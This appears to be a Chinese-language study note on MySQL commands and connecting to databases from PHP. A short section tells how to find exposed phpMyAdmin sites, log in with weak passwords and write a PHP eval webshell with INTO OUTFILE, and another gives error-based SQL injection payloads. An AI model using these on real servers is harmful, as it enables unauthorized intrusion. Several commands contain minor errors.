---
title: PHP与MySQL
date: 2018-12-23 17:58:24
tags:
---
# 数据库

[TOC]



### 一、数据库简介：

数据库：一个用来存放数据的服务或者平台，要么以结构化（数据库、表、数据）形式存放。要么以非结构化（key=value）形式存储。

##### 数据库分类：

​		关系型数据库：MySQL、SQL server、Oracle、DB2等等。

​		非关系型数据库：redis、Mongodb、Hbase、NoSQL等等。

​		Mysql数据库：轻量级开源数据库，适用于中小型企业，性能较好。

​		SQL Server：微软开发的适用于中大型企业，需要微软系统作为支撑，不支持跨平台。

​		Oracle：收费，适用于大型企业的需求，支持跨平台，需要较好的硬件配置做支撑。

##### 结构化数据库

​		例如：学生库（sty_db）-->学生表（stu_table)-->id、name、number、class

​									  			       1	      zs	  21100	     95

​									    				2	       ls        21101 	      95

##### 非结构化数据库

 		 例如：students_1.txt

​						id = 2

​						name=hu

​						number=21100

​						class=95

##### 数据类型

| 类型      | 类型            |
| --------- | --------------- |
| int       | 整形            |
| float     | 浮点型          |
| data      | 日期 YYYY-MM-DD |
| time      | 时间 HH-MM-SS   |
| timestamp | 时间戳          |
| char      | 字符串          |
| varcha    | 长字符串        |
| text      | 文本            |

##### PHP study  配置Mysql环境变量：

​	先找到PHP study里的MySQL安装目录 E:\phpstudy\MySQL\bin，然后计算机右键-->属性-->高级系统设置-->环境变量-->系统变量-->path-->新建-->粘贴MySQL安装目录 E:\phpstudy\MySQL\bin。

​	MySQL默认端口：3306

​	打开数据库管理器-->数据库-->数据表-->字段名(表头)-->表中有几个字段就有几列数据

​	一行数据成为记录。

### 二、基本命令

##### MySQL基础命令

| 命令                | 作用                 |
| :------------------ | :------------------- |
| mysql -uroot -p;    | 进入MySQL            |
| use 库名;           | 进入数据库           |
| show tables;        | 查看当前数据库下的表 |
| select * from 表名; | 查看当前表的数据     |
| select version();   | 显示数据库版本信息   |
| select user();      | 显示当前用户         |

### 三、查看数据库信息类命令

##### 1.查看数据库版本信息

​		select version();

##### 2.显示当前用户

​		select user();

##### 3.查看当前数据库名称

​		show database();

##### 4.获取当前计算机名称

​		select @@hostname;

##### 5.查看数据库版本信息 

​		select @@version;

##### 6.数据库所在位置 

​		select @@basedir;

##### 7.查看系统内核版本

​		uname -a

##### 8.查询当前用户连接数

​		select connection_id 

##### 9.临时文件目录

​		@@tmpdir;

##### 10.真正用来存放数据的地方

​		select @@tmpdir;

##### 11.MySQL注释  

​		#(%23)注释直到结束           --注释本行     /**/内联注释

### 四、字符串操作类命令

##### 1.用来截取字符串中的一部分	

​		mid();   mid('字符串名',1（从哪开始）,2（代表取多少个）);

##### 2.用来显示一个字符串的ASCII 码

​		  ord();  select ord('a');

##### 3.用来拼接字符串

​		  concat();  select concat("i","chun","qiu");

##### 4.使用分隔符来拼接字符串

​		  concat_ws();  select concat_ws("\|","i","chun","qiu");   //i|chun|qiu

##### 5.拼接并分组显示出具

​		group_concat();  select group_concat('\|','k','e','y');  //|key

##### 6.替换字符

​		select insert("ichunqiu",1,1,"kk");一共有四个参数，第一个是被替换的字符串，第二个是从那个开始替		     					换第三个是往后替换多少个，最后是替换成什么。

##### 7.字符串查询：

​			select substring()/mind()/substr()

​			都是三个参数，第一个：被截取的字符串，第二个：开始位置，第三个被截取多少个

### 五、库、表、字段操作

#####  1.删除数据库

​		drop  database 数据库名；

##### 5.删除表

​		drop table  表名

##### 3.创建数据库

​		create database 数据库名

##### 4.创建表

​		create table 表名(id int,name varchar(10));

##### 5.dos命令窗口下创建数据库

​		mysqladmin -uroot -pa410527 create 数据库名

##### 6.dos命令窗口下删除数据库

​		mysqladmin -uroot -pa410527 数据库名

##### 7.更改字段下的数据

​		update 表名 set 字段名1=新值。  //这个操作会把字段名1下的所有值改成新值。

​		update 表名  set 字段名1=新值  where id=1；按条件改

##### 8.删除字段   

​		alter table 表名 drop 字段名； 会把字段和字段下的数据都删了。

​		alter table ning drop id;

##### 9.添加字段  

​		alter table 表名 add 字段名(类型);      alter table ning add id(int);

##### 10.更改字段类型

​		alter table 表名 modify 字段名 字段类型.

##### 11.更改表名

​		alter table 原表名 rename to 新表名；

##### 12查看字段名

​		desc 表名；

##### 13.在已有的字段添加唯一键

​		ALTER TABLE `t_user` ADD unique(`username`);

##### 14.给已有的字段添加主键

​		alter table ning modify id int PRIMARY KEY;

##### 15.给已有的字段添加自增

​		alter table ning modify id int auto_increment;

##### 15.让服务器休息5秒钟select sleep(5);其返回值是0

### 六、数据操作类命令

##### 1.插入数据

​		insert into 表名(字段名1，字段名2，....，字段名n) value (字段1值，字段2值，....,字段n值)；

##### 2.删除数据

​		delete from 表名；  删除整张表

​		delete from 表名 where name='zs';删除某条数据。

##### 3.查询数据

​		select 字段名1，字段名2，字段名n  from 表名；

##### 4.对结果行数限制显示

​		 SELECT * FROM COMPANY LIMIT 3 OFFSET 2; 从第三个记录开始提取 3 个记录

##### 5.按单条件查询数据

​		select username,password from user where id=1；

##### 6.按多条件查询数据

​		select * from stu where number=3331324 and name=huqianwei;

##### 7.like子句(模糊搜索)

​		*表示任意字符   一般用于select * 

​		 % 表示任意字符    例如 select * from ning where name like 'xiao%';  //查询小花

​		  ？表示一个字符   例如 select * from ning where name like '?s';  //查询张三        ​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    

**8.union 联合查询**

​			select * from 表1 union select * from 表2；

​			注意表1 和表2的字段个数要保持一致。如果成功查询，表头按表1的表头显示。

##### 9.数据顺序排列

​			例如：select * from user where city="beijing" order by 'name'; //默认按升序排列；

​			例如：select * from user order by uid desc; 按uid降序排列  asc升序   desc降序  默认升序。

​			order by n ,对第n列进行排序，如果n超过数据表的列数就会报错！！！		

##### 10.对结果进行分组	

​			group by 通常和COUNT，SUM，AVG等函数一起用

​			select from name,COUNT(*) from ning group by name;

##### 11.从左查询

​		select left("helloword",5);  第一个参数是被截取的字符串，第二个是查询多少个.

##### 12.从右查询

​		select right("helloword",5);  第一个参数是被截取的字符串，第二个是查询多少个.

##### 13.查询结果去重

​			SELECT  DISTINCT field FROM table_name WHERE conditions ；	

​			SELECT  group_concat(DISTINCT field) FROM table_name WHERE conditions ；

### 七、数据导入/出		                                                                                                                           

##### 1.MySQL导入数据

​		第一种方法：数据库文件(ning.sql)会自动创建数据库则执行mysql  -u用户名 -p密码  <  文件名(ning.sql)

​					如果数据库文件不会自动创建数据库则需要登录数据库mysql  -u用户名 -p密码

​					然后进入库（test）,执行 source 路径/ning.sql

​		 第二种方法：mysqllimport -uroot -p --local

##### 2.MySQL导出数据

​	 	第一种方法：select * from 表名 into outfile "G://news.txt"

​					第一种修改MySQL文件导出方法

​					先执行命令 show global variables like '%secure_file_priv%';

```mysql
				secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。
				secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行				导入导出，其他目录不能执行。
				secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。
                然后在进入mysql的配置文件vi /etc/my.cnf ，在最后输入secure_file_priv=
                最后重启数据库服务就可以导出文件了。
```
##### 3.导出数据库    

​			 mysqldump -uroot -proot test>./database.sql   //在DOS下执行

​			mysqldump -uroot -p 数据库名 > 导出的文件

​			mysqldump -uroot -p 数据库名 表名 > 导出的文件名

​	

​						第二种临时修改 s et global secure_file_priv='';​				

​		  第二种数据导出方法                                                                                                          

​						create table IF NOT EXISTS 表名 如果不存在这个表就创建。	

### 八、简单Getshell

​	通过phpmyadmin 来获取服务器权限(getshell)

​	step 1: 首先通过google hacking找到phpmyadmin的网站

​	setp2:弱口令登录然后执行show global variables like '%secure_file_priv%';判断我们有没有权限

​	setp3:select `'<?php eval($_POST[_]);?>' `into outfile 'G://re2.txt';注意：写木马的路径，一般是/var

​	/www/html

### 九、错误返回操作

##### 1.extractvalue

​		一般情况下要放在条件后
​		extractvalue(XML_document,XPath_string):在第一字符串找后面的,因为找不到所以会返回后面的值
​			第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
​			第二个参数：XPath_string (Xpath格式的字符串)
​			作用：从目标XML中返回包含所查询值的字符串
​			select * from user where user='root' and extractvalue(1,concat(0x7e,(select user()),0x7c));

​		UPDATEXML (XML_document, XPath_string, new_value); 在第一个里面找第二个并替换成第三							个，因为找不到所以返回第二个。

##### 2.updatexml

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
​		第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
​		第三个参数：new_value，String格式，替换查找到的符合条件的数据 
​		作用：改变文档中符合条件的节点的值
​		select * from user where user='root' and (updatexml(1,concat(0x7e,(select user()),0x7e),1));	



### 十、PHP连接数据库

##### 	1.使用mysqli去链接

​	（面向对象和直接使用的方法）

​	setp1:连接数据库

```mysql
<?php
$ip='127.0.0.1';	#定义IP
$uname='root';		#定义用户名
$passwd='a410527';	#定义密码
$conn=mysqli_connect($ip,$uname,$passwd);	#用mysqli_connect来连接数据库
if (!$conn) {	#判断是否连接
    echo "fail";	#如果连接不上则输出失败
}else if{
    	echo "成功";
    }

$create_db_sql="create database dw";
$result=mysqli_query($conn,$create_db_sql);
if (!$result) {
    die("create db fail!".mysqli_error($conn));
}
echo "create db success!!";

?>

```

​	2.使用mysql扩展

3.使用PDO技术(防止sql注入)

```mysql
<?php
$db_conf=array(     //定义数据库参数
    'host'=>'127.0.0.1:3306',
    'uname'=>'root',
    'pass'=>'a410527',
    'db'=>'ning');
$dsn="mysql:dbname=ning;host=127.0.0.1";
$pdo=new PDO($dsn,$db_conf['uname'],$db_conf['pass']);  //连接数据库
$pdo->exec("set names 'utf8'");  //设置字符集
$sql="select * from ning where id = ?";  //当此处是？号时，在绑定的时候需要以数字开始，如果是:aa开始则绑定时':aa'
$stmt = $pdo->prepare($sql);     //预处理
$stmt->bindValue(1,'1',PDO::PARAM_STR);    //绑定语句
$rs = $stmt->execute();//执行
if($rs){
        while ($row=$stmt->fetch(PDO::FETCH_ASSOC)){
            var_dump($row);
            echo $row['id'];
        }
}
$pdo = null;
?>
```

 

google hacking